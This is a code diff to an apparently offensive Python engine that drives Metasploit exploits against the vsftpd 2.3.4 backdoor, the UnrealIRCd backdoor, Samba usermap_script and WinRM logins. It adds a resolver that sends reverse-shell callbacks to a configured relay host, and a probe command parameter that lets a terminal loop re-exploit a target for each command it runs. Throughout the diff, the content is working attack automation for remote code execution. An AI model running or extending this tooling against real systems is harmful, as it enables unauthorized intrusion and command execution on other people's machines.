@@ -260,29 +260,77 @@ class MetasploitRPCEngine:
             logger.exception("MetasploitRPC exploit failed: %s", module_path)
             return {"status": "failed", "reason": str(exc), "engine": "metasploit"}
 
-    async def exploit_vsftpd(self, target_ip: str) -> dict[str, Any]:
-        """Exploit vsftpd 2.3.4 backdoor (T1190) — bind shell, no LHOST needed."""
+    def _resolve_lhost(self, explicit_lhost: "str | None") -> str:
+        """SPEC-054: Resolve LHOST from explicit arg, settings.RELAY_IP, or fallback.
+
+        Precedence:
+          1. Explicit ``lhost=`` keyword argument passed by the caller
+          2. ``settings.RELAY_IP`` if non-empty
+          3. ``"0.0.0.0"`` as a degraded-mode sentinel — exploit will
+             still run but the existing warning in ``_run_exploit``
+             will surface the fact that the reverse shell is unlikely
+             to call back.
+        """
+        if explicit_lhost is not None:
+            return explicit_lhost
+        return settings.RELAY_IP or "0.0.0.0"
+
+    async def exploit_vsftpd(
+        self,
+        target_ip: str,
+        *,
+        probe_cmd: str = "id; uname -a; hostname",
+    ) -> dict[str, Any]:
+        """Exploit vsftpd 2.3.4 backdoor (T1190) — bind shell, no LHOST needed.
+
+        SPEC-054: accepts ``probe_cmd`` keyword so terminal.py's per-command
+        re-exploit loop can drive this method like the reverse-shell variants.
+        """
         module, payload = _EXPLOIT_MAP["vsftpd"]
         return await self._run_exploit(
-            module, payload, {"RHOSTS": target_ip}
+            module, payload, {"RHOSTS": target_ip},
+            probe_cmd=probe_cmd,
         )
 
     async def exploit_unrealircd(
-        self, target_ip: str, lhost: str = "0.0.0.0"
+        self,
+        target_ip: str,
+        lhost: "str | None" = None,
+        *,
+        probe_cmd: str = "id; uname -a; hostname",
     ) -> dict[str, Any]:
-        """Exploit UnrealIRCd 3.2.8.1 backdoor (T1190)."""
+        """Exploit UnrealIRCd 3.2.8.1 backdoor (T1190).
+
+        SPEC-054: ``lhost`` defaults to ``None`` so the effective value
+        is resolved from ``settings.RELAY_IP`` via ``_resolve_lhost``.
+        Pass ``lhost=`` explicitly to override (e.g. unit tests).
+        """
         module, payload = _EXPLOIT_MAP["unrealircd"]
+        effective_lhost = self._resolve_lhost(lhost)
         return await self._run_exploit(
-            module, payload, {"RHOSTS": target_ip, "LHOST": lhost}
+            module, payload,
+            {"RHOSTS": target_ip, "LHOST": effective_lhost},
+            probe_cmd=probe_cmd,
         )
 
     async def exploit_samba(
-        self, target_ip: str, lhost: str = "0.0.0.0"
+        self,
+        target_ip: str,
+        lhost: "str | None" = None,
+        *,
+        probe_cmd: str = "id; uname -a; hostname",
     ) -> dict[str, Any]:
-        """Exploit Samba usermap_script (T1190)."""
+        """Exploit Samba usermap_script (T1190).
+
+        SPEC-054: ``lhost`` defaults to ``None`` so the effective value
+        is resolved from ``settings.RELAY_IP`` via ``_resolve_lhost``.
+        """
         module, payload = _EXPLOIT_MAP["samba"]
+        effective_lhost = self._resolve_lhost(lhost)
         return await self._run_exploit(
-            module, payload, {"RHOSTS": target_ip, "LHOST": lhost}
+            module, payload,
+            {"RHOSTS": target_ip, "LHOST": effective_lhost},
+            probe_cmd=probe_cmd,
         )
 
     async def exploit_winrm(
@@ -290,13 +338,21 @@ class MetasploitRPCEngine:
         target_ip: str,
         username: str = "administrator",
         password: str = "",
+        *,
+        probe_cmd: str = "id; uname -a; hostname",
     ) -> dict[str, Any]:
-        """WinRM credential login (T1021.001)."""
+        """WinRM credential login (T1021.001).
+
+        SPEC-054: accepts ``probe_cmd`` for uniformity with other
+        exploit methods (terminal.py drives all exploit methods with
+        ``probe_cmd=cmd`` in its per-command re-exploit loop).
+        """
         module, _ = _EXPLOIT_MAP["winrm"]
         return await self._run_exploit(
             module,
             "",
             {"RHOSTS": target_ip, "USERNAME": username, "PASSWORD": password},
+            probe_cmd=probe_cmd,
         )
 
 
